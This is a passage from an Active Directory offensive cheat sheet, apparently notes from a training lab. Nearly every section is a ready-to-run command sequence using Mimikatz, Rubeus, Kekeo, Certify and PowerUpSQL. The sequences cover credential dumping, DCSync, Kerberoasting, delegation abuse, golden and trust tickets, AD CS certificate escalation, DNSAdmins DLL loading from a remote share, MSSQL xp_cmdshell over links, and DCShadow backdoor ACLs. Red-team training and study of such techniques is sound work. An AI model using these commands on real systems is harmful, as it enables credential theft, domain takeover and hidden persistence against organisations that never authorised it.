mimikatz#  !+
mimikatz#  !processprotect /process:lsass.exe /remove
mimikatz#  misc::skeleton
mimikatz#  !-
```

### Directory Services Restore Mode (DSRM)

- **Invoke-Mimikatz:**
```powershell
# DSRM is kind of local admin for Domain controller (needed for Directory Service Restore Mode)
# DSRM hash is stored locally in the SAM: Command to get DSRM hash (administrator) is:
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::sam"' -ComputerName dcorp-dc.corporate.corp.local

# Compare the hash with the administrator hash from command "lsadmp::lsa /patch": they are different
# Once got the hash of DSRM it's possible to use it for pass the hash

# But before a change to registry is needed (permit logon from network to )
# HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2 (DWORD)
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD

# Then run powershell on domain controller (pass the hash with NTLM hash
Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc /user:Administrator /ntlm:XXXX /run:powershell.exe"'
```

### Custom-SSP
```powershell
# SSP is a DLL that provides an application ways to authenticated. Some MIcrosoft packages:
# - NTLM
# - Kerberos
# - Wdigest
# - CredSSP
# Mimikatz provides a custom SSP in mimilib.dll
# This lib logs all logons (local, service account, machine account) into a clear text on the computer (c:\windows\ystem32\mimilsa.log)

# It can be done with mimikatz (not very stable in recent windows Server versions)
Invoke-Mimikatz -Command '"misc::memssp"'

# Another way is to manually add mimilib.dll as Security package:
# First drop the mimilib.dll in c:\windows\system32
# Then modify a registry key to add mimilib.dll as Security Package:
# HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
$packages = Get-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select -ExpandProperty ìSecurity Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -value $packages
Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -value $packages
```

### AdminSDHolder
```powershell
# There is a OU who is used as a reference for ACL on Protected groups
# every 60 minutes there's a scheduled task that replace ACL on "Domain ADmins" "Server admins" "Backup operator" (etc..) groups
# This to revert dangerous changes to ACL on this protected group
# Persistence can be obatined by changing te ACL to this OU named AdminSDHolder

# This command gives full access on AdminSDHolder to user "attacker" with Powerview
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc' -PrincipalIdentity attacker -Verbose -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local

# Other rights can be interesting like "ResetPassword" or "WriteMembers"

# In about 60 minutes  this ACL is propageted to domain admin groups and other privileged groups

# It also can be forced in a few ways

# 1. modifying the registry 
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300 

# 2. using a script InvokeSDPropagator
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

$sess = New-PSSession -computername dcorp-dc
Invoke-Command -Session $sess -FilePath c:\tools\Invoke-SDPropagator.ps1
Invoke-SDPropagator

# After that, the user attacker can add new_da user to "domain admins" group  
Add-DomainGroupMemeber -Identity 'Domain admins' -Members new_da -Vrebose

# and reset password to a domain admin
Set-DomainUserPasword -Identity new_da (ConvertTo-SecureString "Passw0rd123!" -AsPlainTet -Force) -Verbose
``` 

### ACL on Domain OUs
```powershell
# Other interesting persistence can be obtained by giving a full access to a owned user
Add-DomainObjectAcl -TargetIdentity 'dc=dollarcorp,dc=moneycorp,dc=loc' -PrincipalIdentity student1 -Verbose -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local

# OR give Dcysnc rights
Add-DomainObjectAcl -TargetIdentity 'dc=dollarcorp,dc=moneycorp,dc=loc' -PrincipalIdentity student1 -Verbose -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local
```

### DCSync

- **With PowerView and Invoke-Mimikatz:**
```powershell

# Gets the hash of krbtgt (it is the most static user and can be used for impersonating other
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### ACL for WMI, PSRemoting and remote Registry
```powershell

# SDDL Primer
Ace_type;ace_Flags;rights;object_guid,inherit_object_guid;account_SID
A;CI;CCDCLCSWRPWPRCWD;;;SID
# - A Stand for Access Allowed (D= Denied, AU= System Audit,etc..=
# - CI means "Container Inherit" (OI=Object Inherit, NP: No propagate)
# rights
# - CC: Create child
# - DC: Delete Child 
# - LC: List Content
# - SW:  All vaoidated Writes
# - RP: Read All Properties
# - WP: Write All Properties
# - RC: Read Permission
# - WD: Write Permission

# With the tool RACE.ps1 it's possible to set WMI permission

# Check access as current user (should output information)
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc

# Give access to Remote WMI (root\cimv2 namespace) for local macihne
Set-RemoteWmi -SamAccountName student1  -Verbose

# Add access to Remote WMI on computer dcorp-dc (second one is with explicit credentials)
Set-RemoteWmi -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'  -Verbose
Set-RemoteWmi -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Credential Administrator -Verbose
# The -Remove option remove permission to WMI


# Set access via PSRemoting 
Set-RemotePSRemoting -SAMAccountName student1 -ComputerName dcorp-dc -Verbose

# Execute a process via WMI (maybe a reverse shell):
Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList 'calc.exe' -ComputerName dcorp-dc

# Set access to remote registry for student11 (needs DAMP)
Add-RemoteRegBackdoor -Trustee student1 -ComputerName dcorp-dc -Verbose

# Retrieve hashes (machine, local and domain):
Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
Get-RemoteCachedAccountHash -Computername dcorp-dc -Verbose
```


# Privilege Escalation

### Kerberoast

```powershell
# Kerberoast targets Service Account that are manually created (not the System Managed Service accounts)
# the reason is that their passwords are rarely changed and easier to crack
# The requirement here is to have a valid domain account

# Find user accounts used as Service accounts with PowerView
Get-DomainUser SPN           

# Or using AD module:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Request a TGS with powershell for MSSQLSvc
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" 

# alternative TGS request with Rubeus (list accounts and ask TGS)
# /rc4opsec option is more stealth (only looks for account that only supports RC4_HMAC to avoid downgrade, which is easily detected)
Rubeus kerberoast /stats
Rubeus kerberoast /stats /rc4opsec
Rubeus kerberoast /user:svcadmin /simple
Rubeus kerberoast /user:svcadmin /simple /rc4opsec

# Alternative:
Invoke-Kerberoast -Identity svcadmin

# Check if the TGS has been granted
klist

# Export all Kerberos tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack the Service account password
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi
# Or with john (after krb2john) or hashcat (mode 13100)
```

### Targeted Kerberoasting AS REPs


```powershell
# The idea of this is similar to kerberoasting. It can be done also from a non joined machine with impacket
  
# Enumerating accounts with Kerberos Preauth disabled
Get-DomainUser -PreauthNotRequired -Verbose

# Enumerating the permissions for RDPUsers on ACLs using
Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Enumerating accounts with Kerberos Preauth disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Set unsolicited pre-authentication for test01 UAC settings
Set-DomainObject -Identity test01 -XOR @{useraccountcontrol=4194304} -Verbose

# Request encrypted AS REP
Get-ASREPHash -UserName VPN1user -Verbose

# Or to enumerate and ask hash for all users that has Preath disabled
Invoke-ASREPRoast -Verbose 
```

### Targeted Kerberoasting Set SPN

```powershell
# This can be an alternative to reset password to a user we have write access to
# The idea is to add an SPN to a user we can modify and then Kerberoast the SPN

# Check if user01 already has a SPN (powerview or AD module)
Get-DomainUser -Identity User01 | select serviceprincipalname
Get-ADUser -Identity User01 -Properties serviceprincipalname | select serviceprincipalname

# Set a SPN for the user (powerview or AD module)
Set-DomainObject -Identity User01 -Set @{serviceprincipalname='dcorp/whatever1'}
Set-ADUser -Identity User01 -ServicePrincipalNames @{Add='dcorp/whatever1'}

# Then kerberoast as usual
```

### Kerberos Delegation

### Unconstrained Delegation and Printer Bug

```powershell
# With PowerView
# Search for domain computers with unconstrained delegation enabled
Get-DomainComputer -UnConstrained

# Search for domain computers with unconstrained delegation enabled from property name
Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Search for domain computers with unconstrained delegation enabled from property dnshostname
Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname

# With AD module
# Search for domain computers with unconstrained delegation enabled 
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Now that we identified a computer trusted for delegation, we need to get local admin access to that computer.
# After getting privileges we have to wait for a high privilege user to logon on the computer.
# Since there is delegation, the computer can decrypt the TGS that contains the TGT of the user connected.
# So TGT of the elevated user is available and can be used to impersonate 

# Need to wait for a login from administrator (or other user)

# Exporting all tickets on the trusted computer
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Using administrator ticket (if administrator connected to the trusted server:
Invoke-Mimikatz -Command '"kerberos::ptt c:\users\appadmin\[0;2ce8b3]-02-60a1000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
# "[0;2ce8b3]-02-60a1000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi" is the file containing the TGT of Administrator exported before

# The problem now is: there a way to trigger some users or computer to logon, without waiting an admin interaction?
# There is if some pre-requisites are mateched.
```

### Unconstrained Delegation and Printer Bug

```powershell
# MS-RPRN is Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.
# It's possible to ask to a computer to contact the spooler on a third server.
# The DC will authenticate with its own computer account on the  third server.
# What if the third server is an owned computer trusted for delegation?
# it should be possible to capture the DC TGT 

# On the server with unconstrained delegation enabled (dcorp-appsrv), run rubeus in monitor mode to listen for incoming tickets 
.\Rubeus.exe monitor /interval:5 /nowrap

# from a domain joined machine (student VM) ask to a DC to notify MS-RPRN to the server:
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# some tickets will be printed by the rubeus session monitor mode in base64 format.
# Copy the TGT ticket, remove blanks and new line chars
# paste the TGT in a Rubeus command:
.\Rubeus.exe ptt /ticket:XXXXa.....==

#  Now the current session has the same rights as the DC
# It's possibile to run a DCSYnc attack:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dollarcorp\krbtgt"'

# IT's also possible to do that on LInux with the tool C0ercer
```

### Constrained Delegation

```powershell
# Introduced in Windows Server 2008
# It restricts the target of the delegation to a select Service on a selected computer
# It works on a computer or Service account that has the two attributes:
# - TRUSTED_TO_AUTH_FOR_DELEGATION (indicates the acccount can delegate)
# - msDS-AllowToDelegateTo

# It is usually used for "protocol transition", such as a service (website) with authentication tthat doesn't support kerberos.
# The service account is trusted to delegate to a backend  service

# There are two steps in the delegation (example: user joe connects to webservice (websvc) that has a CIFS backend)
# - S4U2Self: the service account request a TGS for itself on behalf of the user
# - S4U2Proxy: the service can now ask a TGS for the backend service on behalf of the user

# Attack Scenario: service account trusted for delegation is compromised (example: local admin on the server)
# This means that all TGS requested can be decrytped because hash of the Service account is known
# This exposes the TGS of the delegated (target) user that needs to connect to ther backend service (target)
# There is no restriction on the target user: this means that the attacker can access to the target backend service as Domain admin

# Enumeraton of trusted account
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# With AD Module: 
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Attack example with Kekeo (websvc is trusted to delegate to cIFS backend on dcorp-mssql)

# Requesting TGT for the service account (it creates a file containing the kerberos ticket)
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<hash of websvc>

# Requesting TGS for administrator to access CIFS on dcorp-mssql (it creates a TGS ticket file)
kek/tgt:<ticket_file_previous_step> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local

# Use Mimikatz to inject the TGS (pass-the-ticket) obtained in the previous step
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'

# Profit
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# Attack with Rubes (alternative to kekeo)
# Requesting TGT and TGS
.\Rubeus.exe s4u /user:websvc /aes256:<hash_of_websvc> /impersonateuser:Administrator /msdsspn:CIFS/dollarcorp.moneycorp.local /ptt

# Interesting note on Constrained delegation
# Since there is lack of SPN check it's possible to extend access to other target service (like HOST,ldap,etc...)
# IN Rubeus it's possible with the option "/altservice:HOST"
# In kekeo it's possible to specify two service target with the | as separator

kekeo# ... /service:CIFS/server.dollarcorp.moneycorp.LOCAL|ldap/erver.dollarcorp.moneycorp.LOCAL
```

### Resource-Based Constrained Delegation
```powershell
# Constrained delegation has some issues: it can be used to impersonate any user and access all services on the target server
# that's because it is confiugred on the "front-end" service
#
# Resource-based delegation changes this and moves the configuration to the "back-end" service
# An attribute on the back-end service is used: msDS-AllowedToActOnBehalfofOtherIdentity
# This attribute choose which user is able to delegate any other user and access the back-end service.

# Attack scenario
# it's possible to abuse Resource based constrained delegation if we have
# - write permission on the attribute msDS-AllowedToActOnBehalfofOtherIdentity (PrincipalAllowedtoDelegateToAccount) of the target service
# - control over an object with an SPN configured (like a domain joined machine, or a user with msDS-MachineAccountQuota != 0)

# An example: we are a user that has write access to a server dcorp-mgmt and has local admin on the StudentVM
# (Result found with Find-InterestingDomainAcl)
# Add the commputer account of StudentVM$ and StudentVM02$ as permitted to delegate on the target computer
$comps='StudentVM', 'StudentVM02'
Set-ADComputer -Identity dcorp-mgmt -PrincipalAllowedtoDelegateToAccount $comps

# extract AES key for the client computer account (StudentVM$)
Invoke-Mimikatz -Command '"kerberos::ptt sekurlsa::ekeys"'

# Use the AESkey pf studentVM$ machien acccount to access HTTP service on dcorp-mgmt as administrator
Rubeus s4u /user:studentVM$ /aes256:<computer_aes_key) /msdsspn:http/dcorp-mgmt /impersonateuser:Administrator /ptt

# Profit with WinRS session as adomain dministrator on dcorp-mgmt
winrs -r:dcorpm-mgmt cmd.exe
```

### DNSAdmins
```powershell
# This attack can be done to inject a library in the DNS plugins
# it can be done if the user is in the "DNS Admin" group and can restgart DNS service (usually it requires a manual misconfiguration)

# let's add the library to dns plugins from a shared folder to the targethostname
dnscmd targethostname /config /serverlevelplugindll \\172.16.0.10\myshare\library.dll

# Wiht powershell:
# Get current DNS settings
$dnsettings = Get-DnsServerSetting -ComputerName targethostname -Verbose -All
# Add the Dll to the settings
$dnsettings.ServerLevelPluginDll = "\\IP\share\library.dll"
# apply new settings
Set-DnsServerSetting -InputObject $dnsettings -ComputerName targethostname -Verbose

# Then restasrt the service
sc \\targethosotname stop dns
sc \\targethosotname start dns

```


### Child to Parent using Trust Tickets
```powershell
# In a trust  between child and parent, it's possible to move from DA in the child domain to DA in parent domain.
# The trust was initially done by exchanging a trust key between parent and child.

# When a user in the child domain requires a resource in parent domain:
# - The user authenticates to the child Domain controller and gets the TGT
# - The user request a TGS for the resource presenting the TGT
# - The child KDC replies with an inter-realm TGT encrypted with the trust key  (if the resource were in the same domain it would a TGS encrypted by the SPN hash (Kerberoasting))
# - The user ask a TGS to the KDC in the parent domain sending its inter-realm TGT, which replies with a TGS for the resource in the parent domain that the user can use.
# The whole security in this process is in the trust key which is used to sign the inter-realm TGT

# Foreword on SID-History:
# Microsoft introduced aa feature named SIDHIstory to help migration of AD objects from a domain to another.
# Basically it's an additional information in the AD that holds the past SIDs of an object in previous domains.
# After a migration of an object from a domain A to domain B, the object in domain B also contains the SID previously used in the domain A, so the object can identify itself to domain A

# Attacking scenario (Domain admin in the child domain is required)
# The idea is to leverage SID-History of the child domain user.
# 1. Get the trust key with mimikatz in the child domain
# 2. Forge a golden ticket that includes in the SID-HIstory the SID of the "Enterprise Admin" group (RID is 519) of the parent domain (<SID of parent domain>-519)
# 3. Use the golden ticket for PTT and access the parent domain

# First step is to extract the trust key from the child (which is compromised) using on of the three methods below. Which key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadumd::dcsync /user:dcorp\mcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# There are multiple keys (different timestamp)
# Choose the most recent ([ In ]) 


# The key to be extracted must be
# Generate the Golden ticket using
# /sid: SID of the child domain
# /sids: SID of the parent domain "Enterprise admins group" (forged Sid-History)
# /rc4:  trust key in rc4 format
# /target: parent domain name
# /ticket: the arget file to store the golden ticket
BetterSafetyKatz "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:<hash> /service:krbtgt /target:moneycorp.local /ticket:C:\<directory>\trust_tkt.kirbi" "exit"

# Get a TGS for CIFS service using the golden ticket (asktgs) and inject it(kirbikator)
asktgs.exe C:\<directory>\trust_tkt.kirbi CIFS/mcorp-dc.corporate.local
kirbikator.exe lsa .\CIFS.mcorp-dc.corporate.local.kirbi

# Alternatively use Rubes in one 
Rubeus.exe asktgs /ticket:C:\<directory>\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

# profit with
ls \\mcorp dc.corporate.local\c$

# Obviously this can ba done also for HTTP, HOST, RPCSS services to access various services.
# In a multilevel schema it's possible to do the previous steps multiple times to compromise one parent at a time until reaching the forest root
```

### Child to Parent using Krbtgt Hash

```powershell
# Easier version of the previous
# Look for krbtgt  hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'      

# Get the TGS from child domain pushing the SID-HIstory and user over-pass-the-hash
# The parent  domain will trust the ticket even if it is created in the child domain
# No need to use other 
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:<hash> /ptt" "exit"

# Access  
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.corporate.local

# Dcsync across domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local"'

# Additional notet on SID History (https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/) 
# In some complex contexts (filtering/monitoring between domains) it can help to add some extra SIDs
# forest root Domain controllers (forest_root_SID-516)
# Enterprise Domain controller (S-1-5-9)
Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:<hash> /ptt" "exit"
```

### Across Forest using Trust Tickets

```powershell
# Forest is considered to be a Security Boundary
# Injecting a SID-History for target "Enterprise admins" group doesn't work because
# There is a SID Filtering between two forest that remove the RIDs beetween 500 and 1000 from the SID-History (so it's not possible to fake privileged identity into another forest)

# However it's possible to resources shared from the target forest to the source forest (standard shares, but no c$ and administrative shares)

# Request the trust key for the inter forest trust
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 

# Forge a Golden ticket with source moneycorp.local and target eurocorp.local
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:<hash> /service:krbtgt /target:eurocorp.local /ticket:C:\test\kekeo_old\trust_forest_tkt.kirbi"'

# Then request TGS for CIFS service in the other forest and iject with kirbikator
.\asktgs.exe C:\test\trust_forest_tkt.kirbi CIFS/eurocorp-dc.corporate.local
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.corporate.local.kirbi

# Alternative with Rubeus
Rubeus.exe asktgs /ticket:C:\test\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorpm-dc.eurocorp.local /ptt

# Profit (only resources specifially shared to the source forest: access to C$ is not permitted)
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp

# The question is now: how to enumerate resources?
# - enmeration from a non privileged user on the target forest is always possible
# - enumerate machines in the target forest
# - request a TGS for CIFS for each one machine
# - use "net view" command for each machine

# DCSync is not possible, unless there is a non privileged user that has Replication rights

```

### Certificates - AD CS
```powershell
# There are multiple attacks:
# - stealing: certificate with private keys export with various tecniques (API, PKinit, files, ...)
# - persistence forging certificates, adding rogue CA, modifying existing CAs
# - Escalation: multiple ways to abuse misconfigurations

# Escalation techniques:
# - ESC1: security settings permits to any user to request certifitaces
# - ESC2: any purpose or no EKU 
# - ESC3: request an enroll agent certificate and use it to request cert on behalf of ANY user
# - ESC4: overly permissive ACLs on Templates
# - ESC5: poor access control on CA server
# - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CA (permits to add a SAN to escalate)
# - ESC7: Poor access control on roles on CA ("CA administrator" or "Certificate Manger)
# - ESC8: NTLM relay to HTTP enrollmnet endpoints

# Tools:
# - Certify
# - certipy

# Enumerating  AD CS 
Certify.exe cas

# Enumerating  templates
Certify.exe find

# Finding vulnerable templates
Certify.exe find /vulnerable

### ESC1 abuse
# In the case a template has the ENROLLEE_SUPPLIES_SUBJECT flag set and we can enroll it, we can abuse ESC1
# Enumerating template for ESC1:
.\Certify.exe find /enrolleeSuppliesSubject

# request a certificate adding the Alternative name of Administrator
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator

# Cut and paste the output into a esc1.pem file
# Then use openssl tool to convert to pfx (supply a password to encrypt the private key)
openssl pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx

# Then request a TGT as administrator supplying the ESC6.pfx as authentication (/password is the password used to convert from pem to pfx)
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt

### ESC6 abuse
# In the case a template has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set and we can enroll it, we can abuse ESC6
# request a certificate adding the Alternative name of Administrator
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator

# Cut and paste the output into a esc6.pem file
# Then use openssl tool to convert to pfx (supply a password to encrypt the private key)
openssl pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc6.pfx

# Then request a TGT as administrator supplying the ESC6.pfx as authentication
Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt

### ESC3 abuse
# In the case we have a vulnerable template where the EKU contains "Certificate Request Agent", we can enroll it and it can be used for domain authentication
# Export the finding
Certify.exe find /json /outfile:C:\Tools\file.json

# Verify if EKU contains property 1.3.6.1.5.5.7.3.2 (clientAuth) 
((Get-Content C:\Tools\file.json |ConvertFrom-Json).CertificateTemplates | ?{$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *

# In this case we have to request two certificates.
# The  first one is the certificate for the Request agent
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent"

# Save the output anc convert to a pfx named (for example) esc3agent.pfx
# Next use this pfx to request a cetificate on behalf of administrator (domain admin, not enteprise admin)
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent" /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123

# Next save the output and convert to esc3age-DA.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc3agent-DA.pfx /password:SecretPass@123 /ptt

# Now we're domain admin in dcorp domain
# WE can escalte to EA changing the onbehalof paramenter
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent" /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123

# Save the output and convet to esc3agent-EA.pfx
# Pass the certificate to forest root
Rubeus.exe asktgt /user:administrator /certificate:esc3agent-EA.pfx /password:SecretPass@123 /dc:mcorp-dc.moneycorp.local /user:moneycorp.local\administrator /ptt
```

# Trust Abuse MSSQL Servers
```powershell
# MS SQL Server can be used for lateral movement because domain users can be mapped to Database roles.
# Also because there can be couigfration 
```
#### Tools
#### PowerUpSQL:
```powershell
. .\PowerUpSQL.ps1
```

**1. Enumeration:**
```powershell

# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Check accessibility for current user on found instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Getting more information on accessible Instances 
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Executing a query on accessible SQL Server:
Get-SQLQuery -Instance dcorp-mgmt -Query "select @@version as version"

# If we have SysAdmin role it's good!
# because Sysadmin role can configure "Command Execution" feature (disabled by default)
# Otherwise we need to find a way to get more privileged role one MS SQL
Get-SQLQuery -Instance dcorp-mgmt -Query "EXEC sp_configure 'show advanced options', 1"
Get-SQLQuery -Instance dcorp-mgmt -Query " GO"
Get-SQLQuery -Instance dcorp-mgmt -Query "RECONFIGURE"
Get-SQLQuery -Instance dcorp-mgmt -Query "GO"
Get-SQLQuery -Instance dcorp-mgmt -Query "EXEC sp_configure 'xp_cmdshell', 1"
Get-SQLQuery -Instance dcorp-mgmt -Query "GO"
Get-SQLQuery -Instance dcorp-mgmt -Query "RECONFIGURE"
Get-SQLQuery -Instance dcorp-mgmt -Query "GO"

# Sysadmin role can configure "command Execution" feature
Get-SQLQuery -Instance dcorp-mgmt -Query "select @@version as version"



```

**2. Database Links:**
```powershell
# Database Links allows a SQL Server to access data provided by another source (another SQL Server or OLE DB data source)
# IN case of links to a SQL Server, ot's possibile to execute stored procedure across the link
# Links works across forest trust

# Enumerating Database Links
# This also inform if rpcout is enabled (by default it's not
Get-SQLServerLink -Instance dcorp-mssql -Verbose

# Or using a direct query on the SQL Server:
select * from master..sysservers

# Enumerating Database Links chains (if there are "transitive" links between three servers
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

# or specifying a link (it can be also transitive)
select * from openquery("dcorp-sql1",'select * from master..sysservers')
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from master..sysservers")')

# Executeing a store procedure on a linked server:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"

# Executing commands across Database LInks
Get-SQLServerLinkCrawl -Instance dcorp-mssql.corp.corporate.local -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget  eu-sql

select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eurocorp.local",""select @@version as version; exec master..xp_cmdshell "powershell whoami""")")")')

# Executing a remote whoami
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eu.corporate.local",""select@@version as version;exec master..xp_cmdshell "powershell whoami)"")")')

```

# Forest Persistence DCShadow

**1. Setting the permissions:**
```powershell
# Setting the permissions
Set-DCShadowPermissions -FakeDC corp-user1 -SAMAccountName root1user -Username user1 -Verbose
```
**2. Use Mimikatz to stage the DCShadow attack:**
```powershell
# Set SPN for user
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"
# Set SID History for user
lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280565432-1493477821-700767426-345
# Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl
# Then get target user SID:
Get-NetUser -UserName BackdoorUser | select objectsid
# Add full control primitive for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-280565432-1493477821-700767426-345]])
```
